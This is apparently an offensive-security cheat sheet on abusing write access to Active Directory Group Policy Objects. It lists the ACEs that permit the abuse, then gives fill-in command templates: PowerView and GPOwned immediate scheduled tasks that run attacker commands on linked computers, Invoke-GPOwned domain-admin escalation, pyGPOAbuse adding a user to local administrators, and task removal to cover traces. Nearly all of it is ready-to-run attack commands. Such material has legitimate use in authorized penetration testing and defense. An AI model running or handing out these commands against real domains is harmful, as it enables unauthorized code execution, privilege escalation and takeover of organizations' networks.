---
technique: GroupPolicyAbuse
category: gpo-abuse
ace: GenericAll, GenericWrite, WriteDacl, WriteOwner, WriteProperty
targets: GPO, OU-linked Computers
protocols: LDAP, SMB
remote_capable: true
tags: gpo group-policy scheduled-task powerview sharpgpoabuse pygpoabuse ad
---

# GroupPolicyAbuse

Write access to a GPO can provide code execution on computers and users linked to that policy. Immediate scheduled tasks are the common operator path because they run during Group Policy refresh and can remove themselves afterward.

## Required ACEs

| ACE | What it grants |
|-----|----------------|
| GenericAll | Full control over the GPO |
| GenericWrite | Write access to GPO attributes and policy content |
| WriteDacl | Ability to grant rights over the GPO |
| WriteOwner | Ability to take ownership and modify the DACL |
| WriteProperty | Write access to GPO properties such as `gPCFileSysPath` |

## Windows

### PowerView immediate task

#powershell #powerview #scheduled-task

Add an immediate scheduled task to a GPO with PowerView.

```powershell title:"Add immediate scheduled task to GPO with PowerView"
New-GPOImmediateTask -Verbose -Force -TaskName "$task_name" -GPODisplayName "$gpo_name" -Command "$command" -CommandArguments "$command_args"
```
<!-- cheat
var task_name
var gpo_name
var command
var command_args
-->

### PowerView remove immediate task

#powershell #powerview #scheduled-task

Remove the immediate scheduled task from the GPO after execution.

```powershell title:"Remove immediate scheduled task from GPO"
New-GPOImmediateTask -Force -Remove -GPODisplayName "$gpo_name"
```
<!-- cheat
var gpo_name
-->

### Invoke-GPOwned multitask

#powershell #gpo #domain-admin

Create the two-stage GPOwned scheduled task flow against a target GPO.

```powershell title:"Run Invoke-GPOwned multitask escalation"
Invoke-GPOwned -GPOName "$gpo_name" -LoadDLL ".\Microsoft.ActiveDirectory.Management.dll" -User "$user" -DA -ScheduledTasksXMLPath ".\ScheduledTasks.xml" -SecondTaskXMLPath ".\wsadd.xml" -Author "$author" -SecondXMLCMD "$second_command"
```
<!-- cheat
import users
var gpo_name
var author
var second_command
-->

### gpupdate

#cmd #native #gpo

Force a local Group Policy refresh after changing policy content.

```cmd title:"Force local Group Policy refresh"
gpupdate /force
```
<!-- cheat -->

## Linux

### GPOwned immediate task

#python #gpo #scheduled-task

Create an immediate scheduled task in a GPO using GPOwned.

```sh title:"Create GPO immediate task with GPOwned"
GPOwned -u "$user" -p "$pass" -d "$domain" -dc-ip "$rhost_ip" -gpoimmtask -name "$gpo_guid" -author "$author" -taskname "$task_name" -taskdescription "$task_description" -dstpath "$payload_path"
```
<!-- cheat
import domain_ip
import users
import passwords
var gpo_guid
var author
var task_name
var task_description
var payload_path
-->

### pyGPOAbuse local admin

#python #gpo #local-admin

Abuse an existing GPO to add a controlled user to local administrators.

```sh title:"Add local admin through GPO with pyGPOAbuse"
pygpoabuse "$domain/$user:$pass" -gpo-id "$gpo_guid"
```
<!-- cheat
import domain_ip
import users
import passwords
var gpo_guid
-->
